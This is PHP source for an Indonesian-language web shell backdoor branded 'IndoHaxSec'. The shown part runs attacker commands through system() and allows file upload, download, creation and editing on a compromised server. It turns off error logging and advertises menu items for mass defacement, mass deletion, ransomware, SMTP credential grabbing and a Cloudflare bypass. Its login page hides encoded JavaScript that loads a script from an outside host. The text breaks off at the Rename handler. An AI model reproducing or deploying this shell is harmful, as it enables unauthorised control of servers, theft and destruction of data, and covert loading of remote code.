<?php
/*
	* Konsep Shell : mematikan -anti403 { IndoHaxSec }-
	* Pembuat : K3T0PR4K -Leader { IndoHaxSec }-
	
	* Re-Code Boleh Asal Dah Izin Sama Pembuat, Ganti Author & Re-Code Tanpa Seizin Pembuat... Fix Lo Noob Anjenk, Klo Kga Bisa Bikin Cek 
	* Chanel IndoSec, Ada Tutornya, Jangan Cuma Bisa Ganti Author Doank Bangsad

	* Thanks For All Member { IndoHaxSec }, Yang Telah Membantu Proses Pembuatan Shell,Dan Dari Shell Lain Untuk Inspirasinya

	*[ IndoHaxSec Shell ]
	* Untuk Tools Yang Lain Akan Ditambahkan DiVersi Berikutnya..
	* �2024 [ IndoHaxSec ] -K3T0PR4K-
*/
session_start();
error_reporting(0);
set_time_limit(0);
@clearstatcache();
@ini_set('error_log',NULL);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
@ini_set('output_buffering',0);
@ini_set('display_errors', 0);

/* Configurasi */
$auth_pass 			= "5feb52446105aa26fd43b2d6eafca681";// indohaxsec14
$color 				= "#FFD700";
$default_action 	= 'FilesMan';
$default_use_ajax 	= true;
$default_charset 	= 'UTF-8';

function login_shell() {
?>
<!DOCTYPE html>
<html>
	<head>
		<meta name="viewport" content="widht=device-widht, initial-scale=1.0"/>
		<meta name="author" content="Holiq"/>
		<meta name="copyright" content="{ IndoHaxSec }"/>
		<title>INDOHAXSEC SHELL</title>
		<link rel='icon' type='image/png' href='https://i.ibb.co.com/t8LsHcF/Screenshot-20241110-234536-Gallery.jpg'/>
		<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.0/css/bootstrap.min.css"/>
		<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.1/css/all.css"/>
	</head>
	<body class="bg-dark text-light">
		<center>
			<div class="container" style="margin-top: 15%">
				<div class="col-lg-6">
					<div class="form-group">
						<h1 class="text-center">[ INDOHAXSEC SHELL ]</h1>
						<h5 class="text-center pb-5">IndoHaxSec Team</h5>
						<form method="post">
							<input type="password" name="pass" placeholder="USER ID" class="form-control"><br/>
							<input type="submit" class="btn btn-danger btn-block" class="form-control" value="Login">
						</form>
					</div>
				</div><a href="https://t.me/INDOHAXSEC" class="text-muted fixed-bottom">Copyright 2024 @ [ IndoHaxSec ]</a><br/>
			</div>
		</center>
		<script language=javascript>document.write(unescape('%3C%73%63%72%69%70%74%20%6C%61%6E%67%75%61%67%65%3D%22%6A%61%76%61%73%63%72%69%70%74%22%3E%66%75%6E%63%74%69%6F%6E%20%64%46%28%73%29%7B%76%61%72%20%73%31%3D%75%6E%65%73%63%61%70%65%28%73%2E%73%75%62%73%74%72%28%30%2C%73%2E%6C%65%6E%67%74%68%2D%31%29%29%3B%20%76%61%72%20%74%3D%27%27%3B%66%6F%72%28%69%3D%30%3B%69%3C%73%31%2E%6C%65%6E%67%74%68%3B%69%2B%2B%29%74%2B%3D%53%74%72%69%6E%67%2E%66%72%6F%6D%43%68%61%72%43%6F%64%65%28%73%31%2E%63%68%61%72%43%6F%64%65%41%74%28%69%29%2D%73%2E%73%75%62%73%74%72%28%73%2E%6C%65%6E%67%74%68%2D%31%2C%31%29%29%3B%64%6F%63%75%6D%65%6E%74%2E%77%72%69%74%65%28%75%6E%65%73%63%61%70%65%28%74%29%29%3B%7D%3C%2F%73%63%72%69%70%74%3E'));dF('%264Dtdsjqu%2631tsd%264E%2633iuuqt%264B00ibdljohuppm/ofu0mpht0dj%7B/kt%2633%264F%264D0tdsjqu%264F%26311')</script>
	</body>
</html>
<?php
exit;
}
if(!isset($_SESSION[md5($_SERVER['HTTP_HOST'])]))
if( empty($auth_pass) || ( isset($_POST['pass']) && (md5($_POST['pass']) == $auth_pass) ) )
	$_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
else
login_shell();
if(isset($_GET['file']) && ($_GET['file'] != '') && ($_GET['aksi'] == 'download')) {
	@ob_clean();
	$file = $_GET['file'];
	header('Content-Description: File Transfer');
	header('Content-Type: application/octet-stream');
	header('Content-Disposition: attachment; filename="'.basename($file).'"');
	header('Expires: 0');
	header('Cache-Control: must-revalidate');
	header('Pragma: public');
	header('Content-Length: ' . filesize($file));
	readfile($file);
	exit;
}
/*Akhir login*/
?>
<?php
	function w($dir,$perm) {
		if(!is_writable($dir)) {
			return "<font color=red>".$perm."</font>";
		} else {
			return "<font color=lime>".$perm."</font>";
		}
	}
	function r($dir,$perm) {
		if(!is_readable($dir)) {
			return "<font color=red>".$perm."</font>";
		} else {
			return "<font color=lime>".$perm."</font>";
		}
	}

	function exe($cmd) {
		if(function_exists('system')) {
			@ob_start();
			@system($cmd);
			$buff = @ob_get_contents();
			@ob_end_clean();
			return $buff;
		} elseif(function_exists('exec')) {
			@exec($cmd,$results);
			$buff = "";
			foreach($results as $result) {
				$buff .= $result;
			} return $buff;
		} elseif(function_exists('passthru')) {
			@ob_start();
			@passthru($cmd);
			$buff = @ob_get_contents();
			@ob_end_clean();
			return $buff;
		} elseif(function_exists('shell_exec')) {
			$buff = @shell_exec($cmd);
			return $buff;
		}
	}
	
	function perms($file){
		$perms = fileperms($file);
	
		if (($perms & 0xC000) == 0xC000) {
			// Socket
			$info = 's';
		} elseif (($perms & 0xA000) == 0xA000) {
			// Symbolic Link
			$info = 'l';
		} elseif (($perms & 0x8000) == 0x8000) {
			// Regular
			$info = '-';
		} elseif (($perms & 0x6000) == 0x6000) {
			// Block special
			$info = 'b';
		} elseif (($perms & 0x4000) == 0x4000) {
			// Directory
			$info = 'd';
		} elseif (($perms & 0x2000) == 0x2000) {
			// Character special
			$info = 'c';
		} elseif (($perms & 0x1000) == 0x1000) {
			// FIFO pipe
			$info = 'p';
		} else {
			// Unknown
			$info = 'u';
		}
	
		// Owner
		$info .= (($perms & 0x0100) ? 'r' : '-');
		$info .= (($perms & 0x0080) ? 'w' : '-');
		$info .= (($perms & 0x0040) ?
		(($perms & 0x0800) ? 's' : 'x' ) :
		(($perms & 0x0800) ? 'S' : '-'));
		// Group
		$info .= (($perms & 0x0020) ? 'r' : '-');
		$info .= (($perms & 0x0010) ? 'w' : '-');
		$info .= (($perms & 0x0008) ?
		(($perms & 0x0400) ? 's' : 'x' ) :
		(($perms & 0x0400) ? 'S' : '-'));
		
		// World
		$info .= (($perms & 0x0004) ? 'r' : '-');
		$info .= (($perms & 0x0002) ? 'w' : '-');
		$info .= (($perms & 0x0001) ?
		(($perms & 0x0200) ? 't' : 'x' ) :
		(($perms & 0x0200) ? 'T' : '-'));

		return $info;
	}
	
	
	if(isset($_GET['path'])){
		$path = $_GET['path'];
		chdir($path);
	}else{
		$path = getcwd();
	}
	$path = str_replace('\\','/',$path);
	$paths = explode('/',$path);
	if(isset($_GET['dir'])) {
		$dir = $_GET['dir'];
		chdir($dir);
	} else {
		$dir = getcwd();
	}
	$os = php_uname();
	$ip = getHostByName(getHostName());
	$ver = phpversion();
	$dom = $_SERVER['HTTP_HOST'];
	$dir = str_replace("\\","/",$dir);
	$scdir = explode("/", $dir);
	$mysql = (function_exists('mysql_connect')) ? "<font color=lime>ON</font>" : "<font color=gold>OFF</font>";
	$curl = (function_exists('curl_version')) ? "<font color=lime>ON</font>" : "<font color=gold>OFF</font>";
	$total = formatSize(disk_total_space($path));
	$free = formatSize(disk_free_space($path));
	$total1 = disk_total_space($path);
	$free1 = disk_free_space($path);
	$used = formatSize($total1 - $free1);
	function formatSize( $bytes ) {
		$types = array( 'B', 'KB', 'MB', 'GB', 'TB' );
		for( $i = 0; $bytes >= 1024 && $i < ( count( $types ) -1 ); $bytes /= 1024, $i++ );
		return( round( $bytes, 2 ) . " " . $types[$i] );
	}
	
	function ambilKata($param, $kata1, $kata2){
		if(strpos($param, $kata1) === FALSE) return FALSE;
		if(strpos($param, $kata2) === FALSE) return FALSE;
		$start = strpos($param, $kata1) + strlen($kata1);
		$end = strpos($param, $kata2, $start);
		$return = substr($param, $start, $end - $start);
		return $return;
	}
	
?>
<html>
	<head>
		<meta name="viewport" content="widht=device-widht, initial-scale=1"/>
		<meta name="author" content="K3T0PR4K"/>
		<meta name="copyright" content="[ INDOHAXSEC TEAM ]"/>
		<link rel="icon" type="image/png" href="https://i.ibb.co.com/t8LsHcF/Screenshot-20241110-234536-Gallery.jpg"/>
		<title>[ IndoHaxSec Shell ]</title>
		<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css">
		<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css"/>
		<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css"/>
		<script src="https://code.jquery.com/jquery-3.3.1.js"></script>
		<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js"></script>
	</head>
	<body class="bg-dark text-light">
		<script>
			$(document).ready(function(){
				$(window).scroll(function(){
					if ($(this).scrollTop() > 700) {
						$(".scrollToTop").fadeIn();
					}else{
						$(".scrollToTop").fadeOut();
					}
				});
				$(".scrollToTop").click(function(){
					$("html, body").animate({scrollTop : 0},1000);
					return false;
				});
			});
			
			$(document).ready(function() {
  $('input[type="file"]').on("change", function() {
 let filenames = [];
 let files = document.getElementById("customFile").files;
 if (files.length > 1) {
filenames.push("Total Files (" + files.length + ")");
 } else {
for (let i in files) {
  if (files.hasOwnProperty(i)) {
 filenames.push(files[i].name);
  }
}
 }
 $(this)
.next(".custom-file-label")
.html(filenames.join(","));
  });
});
						
						
		</script>
		<style>
			@import url(https://fonts.googleapis.com/css?family=Lato);
			@import url(http://fonts.googleapis.com/css?family=Quicksand);
			body{margin:0;padding:0;font-family:"Times New Roman";}
			#tab table thead th{padding:5px;font-size:16px;}
			#tab tr {border-bottom:1px solid #fff;}
			#tab tr:hover{background:#441847; color:#a8ff82;}
			#tab tr td{padding:5px;}
			#tab tr td .badge{font-size:13px;}
			.link,
			#tab a {color: gold;}
			.active,.active:hover{color:lime;}
			a {font-family:"Quicksand"; color:gold;}
			a:hover{color:lime;}
			.ico {width:25px;}
			.ico2{width:30px;}
			.scrollToTop{
				position:fixed;
				bottom:30px;
				right:30px;
				width:35px;
				height:35px;
				background:#262626;
				color:#fff;
				border-radius:15%;
				text-align:center;
				opacity:.5;
			}
			.scrollToTop:hover{color:#6bc2ab;}
			.up{font-size:20px;line-height:35px;}
			.lain{color:#75e0df;font-size:20px;margin-left:5px;top:1px;}
			.lain:hover{color:#fff;}
			.tambah{
				width:35px;
				height:35px;
				line-height:35px;
				border:1px solid;
				border-radius:50%;
				text-align:center;
			}
			.fiture{margin:2px;}
			.tmp{background:#F4F4F4;}
			.tmp tr td{border:solid 1px #BBBBBB;text-align:center;font-size:13px;}
			.about{color:#000;}
			.about .card-body .img{
				position: relative;
				background: url(https://static.vecteezy.com/system/resources/previews/009/329/011/non_2x/binary-code-background-digital-binary-data-with-streaming-digital-code-futuristic-cyberspace-concept-of-coding-or-hacker-crypto-data-dark-blue-gradient-background-vector.jpg);
				background-size: cover;
				width: 150px;
				height: 150px;
			}
			.butn {
				position: relative;
				text-align: center;
				padding: 3px;
				background:rgba(225,225,225,.3);
				-webkit-transition: background 300ms ease, color 300ms ease;
				transition: background 300ms ease, color 300ms ease;
			}
			input[type="radio"].toggle {display:none;}
			input[type="radio"].toggle + label {cursor:pointer;margin:0 2px;width:60px;}
			input[type="radio"].toggle + label:after {
				position: absolute;
				content: "";
				top: 0;
				background: #fff;
				height: 100%;
				width: 100%;
				z-index: -1;
				-webkit-transition: left 400ms cubic-bezier(0.77, 0, 0.175, 1);
				transition: left 400ms cubic-bezier(0.77, 0, 0.175, 1);
			}
			input[type="radio"].toggle.toggle-left + label:after {left:100%;}
			input[type="radio"].toggle.toggle-right + label {margin-left:-5px;}
			input[type="radio"].toggle.toggle-right + label:after {left:-100%;}
			input[type="radio"].toggle:checked + label {cursor:default;color:#000;-webkit-transition:color 400ms;transition: color 400ms;}
			input[type="radio"].toggle:checked + label:after {left:0;}
		</style>
		<nav class="navbar static-top navbar-dark">
			<button class="navbar-toggler"type="button" data-toggle="collapse" data-target="#info" aria-label="Toggle navigation">
				<i style="color:#fff;" class="fa fa-navicon"></i>
			</button>
			<div class="collapse navbar-collapse" id="info">
				<ul>
					<a href="https://t.me/INDOHAXSEC" class="lain"><i class="Telegram"></i></a>
		
				</ul>
			</div>
		</nav>
		<?php
		echo '
		<div class="container">
			<h1 class="text-center"><a href="https://t.me/INDOHAXSEC" style="color:#FDC500;">[ INDOHAXSEC ]</h1>
			<center><h5>Shell Backdor</a></h5></center>
			<hr/>
			<div class="text-center">
				<div class="d-flex justify-content-center flex-wrap">
					<a href="?" class="fiture btn btn-danger btn-sm"><i class="fa fa-home"></i> Home</a>
					<a href="?dir='.$dir.'&aksi=upload" class="fiture btn btn-danger btn-sm"><i class="fa fa-upload"></i> Upload</a>
					<a href="?dir='.$dir.'&aksi=buat_file" class="fiture btn btn-danger btn-sm"><i class="fa fa-plus-circle"></i> Buat File</a>
					<a href="?dir='.$dir.'&aksi=buat_folder" class="fiture btn btn-danger btn-sm"><i class="fa fa-plus"></i> Buat Folder</a>
					<a href="?dir='.$dir.'&aksi=masdef" class="fiture btn btn-danger btn-sm"><i class="fa fa-exclamation-triangle"></i> Mass Deface</a>
					<a href="?dir='.$dir.'&aksi=masdel" class="fiture btn btn-danger btn-sm"><i class="fa fa-trash"></i> Mass Delete</a>
					<a href="?dir='.$dir.'&aksi=jumping" class="fiture btn btn-danger btn-sm"><i class="fa fa-exclamation-triangle"></i> Jumping</a>
					<a href="?dir='.$dir.'&aksi=config" class="fiture btn btn-danger btn-sm"><i class="fa fa-cogs"></i> Config</a>
					<a href="?dir='.$dir.'&aksi=adminer" class="fiture btn btn-danger btn-sm"><i class="fa fa-user"></i> Adminer</a>
					<a href="?dir='.$dir.'&aksi=symlink" class="fiture btn btn-danger btn-sm"><i class="fa fa-exclamation-circle"></i> Symlink</a>
					<a href="?dir='.$dir.'&aksi=resetpasscp" class="fiture btn btn-warning btn-sm"><i class="fa fa-key"></i> Auto Reset Cpanel</a>
					<a href="?dir='.$dir.'&aksi=ransom" class="fiture btn btn-warning btn-sm"><i class="fab fa-keycdn"></i> Ransomware</a>
					<a href="?dir='.$dir.'&aksi=smtpgrab" class="fiture btn btn-warning btn-sm"><i class="fas fa fa-exclamation-circle"></i> SMTP Grabber</a>
					<a href="?dir='.$dir.'&aksi=bypascf" class="fiture btn btn-warning btn-sm"><i class="fas fa-cloud"></i> Bypass Cloud Flare</a>
					<a href="?about" class="fiture btn btn-warning btn-sm"><i class="fa fa-info"></i> About Us</a>
					<a href="?keluar" class="fiture btn btn-warning btn-sm"><i class="fa fa-sign-out"></i> keluar</a>
				</div>
			</div>
			<div class="row">
				<div class="col-lg-4"><br/>
					<h5><i class="fa fa-terminal"></i>Terminal : </h5>
					<form>
						<input type="text" class="form-control" name="cmd" autocomplete="off" placeholder="id | uname -a | whoami | heked">
					</form>
					<hr style="backgroud: white"/>
					<h5><i class="fa fa-search"></i> Informasi : </h5>
					<div class="card table-responsive infor">
						<div class="card-body" style="color: #333">
							<table class="table" style="color: #333">
								<tr>
									<td>PHP</td>
									<td> : '.$ver.'</td>
								</tr>
								<tr>
									<td>IP Server</td>
									<td> : '.$ip.'</td>
								</tr>
								<tr>
									<td>HDD</td>
									<td>Total : '.$total.' <br/> Free : '.$free.' ['.$used.']</td>
								</tr>
								<tr>
									<td>Doamin Web</td>
									<td>: '.$dom.'</td>
								</tr>
								<tr>
									<td>MySQL</td>
									<td>: '.$mysql.'</td>
								</tr>
								<tr>
									<td>CURL</td>
									<td>: '.$curl.'</td>
								</tr>
								<tr>
									<td>Sistem Operasi</td>
									<td> : '.$os.'</td>
								</tr>
							</table>
						</div>
					</div>
				</div>
			<div class="col-lg-8"><hr/>';
	
	
	
		//cmd
		if(isset($_GET['cmd'])){
			echo "<pre class='text-white'>";
			echo system($_GET['cmd']);
			echo "</pre>";
			exit;
		}
		
		
		//keluar
		if (isset($_GET['keluar'])) {
			session_start();
			session_destroy();
			echo '<script>window.location="?";</script>';
		}
		
		
		if (isset($_GET['about'])) {
			echo '<div class="card text-center bg-light about">
				<h4 class="card-header">[ IndoHaxSec ]</h4>
				<div class="card-body">
					<center><div class="img"></div></center>
					<p class="card-text">[ INDOHAXSEC TEAM ] Adalah Sebuah Komunitas Yang Berfokus Kepada Cyber Attack  Dan Mengexploitasi Sebuah Sistem.</p>
				</div>
				<div class="card-footer">
					<p class="card-text"><small class="text-muted">Copyright 2024 [ IndoHaxSec ]</small></p>
				</div>
			</div><br/>';
			exit;
		}
		
		
		//upload
		if ($_GET['aksi'] == 'upload') {
			echo '<form method="POST" enctype="multipart/form-data" name="uploader" id="uploader">
				<div class="container mt-5">
					<div class="card mr-auto ml-auto">
						<div class="card-body form-group">
							<div class="custom-file">
								<input type="file" name="file[]" multiple class="custom-file-input" id="customFile">
								<label class="custom-file-label" for="customFile">Choose file</label>
							</div>
							<input type="submit" class="btn btn-sm btn-primary btn-block mt-4 p-2" name="upload" value="Upload">
						</div>
					</div>
				</div>
			</form>';
				
				
			if(isset($_POST['upload'])){
				$countfiles = count($_FILES['file']['name']);
				for($i=0;$i<$countfiles;$i++){
					$filename = $_FILES['file']['name'][$i];
					$uplo = @copy($_FILES['file']['tmp_name'][$i], "$dir/".$filename);
				}
				if($uplo){
					echo '<script>alert("Berhasil Upload '.$countfiles.' File");</script>';
				}else{
					echo '<script>alert("Gagal Upload!!!");</script>';
				}
			}
		}

		//openfile
		if (isset($_GET['file'])) {
			$file = $_GET['file'];
		}
			
		//buat_file
		if ($_GET['aksi'] == 'buat_file') {
			
			$output = "
			<h4>
				<img src='http://icons.iconarchive.com/icons/zhoolego/material/256/Filetype-Docs-icon.png' class='ico2'></img> Buat File: 
			</h4>
			<form method='POST'>
				<input type='text' class='form-control' name='nama_file' autocomplete='off' placeholder='Nama File...'><br/>
				<textarea name='isi_file' class='form-control' rows='8' placeholder='Isi File...'></textarea><br/>
				<button type='sumbit' class='btn btn-info btn-block' name='bikin'>Bikin!!</button><br/>
			</form>";
			echo $output;
		
			if (isset($_POST['bikin'])) {
				$nama_file = $_POST['nama_file'];
				$isi_file = $_POST['isi_file'];
				$handle = fopen("$nama_file", "w");

				if (fwrite($handle, $isi_file)) {
					echo '<script>window.location="?dir='.$dir.'"; alert("Buat File Berhasil");</script>';
				}else{ 
					echo '<script>alert("File Gagal Dibuat");</script>';
				}
			}
		}
		
		/*
			View
		*/
		if($_GET['aksi'] == 'view') {
			echo '[ <a class="active" href="?dir='.$dir.'&aksi=view&file='.$file.'">Lihat</a> ]  [ <a href="?dir='.$dir.'&aksi=edit&file='.$file.'">Edit</a> ]  [ <a href="?dir='.$dir.'&aksi=rename&file='.$file.'">Rename</a> ]  [ <a href="?dir='.$dir.'&aksi=hapusf&file='.$file.'">Delete</a> ]';
			echo "
			<textarea rows='9' class='form-control mb-2' disabled=''>".htmlspecialchars(file_get_contents($file))."</textarea>";
		}
		
		/*
			Edit
		*/
		if($_GET['aksi'] == 'edit') {
			$nama = basename($file);
			echo '[ <a href="?dir='.$dir.'&aksi=view&file='.$file.'">Lihat</a> ]  [ <a class="active" href="?dir='.$dir.'&aksi=edit&file='.$file.'">Edit</a> ]  [ <a href="?dir='.$dir.'&aksi=rename&file='.$file.'">Rename</a> ]  [ <a href="?dir='.$dir.'&aksi=hapusf&file='.$file.'">Delete</a> ]';
			echo "<form method='POST'>
				<h5><i class='fa fa-file'></i> Edit File : $nama</h5>
				<textarea rows='9' class='form-control' name='isi'>".htmlspecialchars(file_get_contents($file))."</textarea><br/>
					<button type='sumbit' class='btn btn-info btn-block' name='edit_file'>Update</button>
			</form>";
			
			if(isset($_POST['edit_file'])) {
				$updt = fopen("$file", "w");
				$hasil = fwrite($updt, $_POST['isi']);
				
				if ($hasil) {
					echo '<script>window.location="?dir='.$dir.'"; alert("Berhasil Update!!");</script>';
				}else{
					echo '<script>alert("Gagal Update!!");</script>';
				}
			}
		}
		
		/*
			Rename
		*/
		if(
